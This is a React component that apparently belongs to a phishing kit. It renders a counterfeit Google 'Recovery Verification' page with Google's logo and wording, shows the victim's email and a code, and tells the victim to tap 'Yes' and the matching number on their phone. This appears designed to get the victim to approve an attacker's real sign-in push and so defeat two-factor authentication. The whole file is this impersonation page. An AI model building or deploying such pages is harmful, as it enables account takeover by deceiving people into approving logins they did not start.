import React from "react";
import { useLocation } from "react-router-dom";
import "./login.css";

const Recovery = () => {
  const location = useLocation();
  const { email, code } = location.state || { email: "user@example.com", code: "--" };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="logo-wrapper">
          <img src="/google.png" alt="Logo" className="login-logo" />
        </div>
        <h2 className="login-title">Recovery Verification</h2>
        <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in </p>
        <div className="email-pill">{email}</div>

        <div style={{ marginTop: "40px" }}>
          <p style={{ fontSize: "38px", fontWeight: "bold", margin: "0 0 20px", textAlign: "center" }}>{code}</p>

          <p style={{ fontSize: "16px", fontWeight: "600", textAlign: "left", marginBottom: "10px" }}>
            Check your phone
          </p>
          <p style={{ fontSize: "14px", color: "#5f6368", textAlign: "left" }}>
            Pull down the notification bar and tap the sign-in notification. Tap <strong>Yes,</strong> and then tap <strong>{code}</strong> on your phone to verify it’s you.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Recovery;
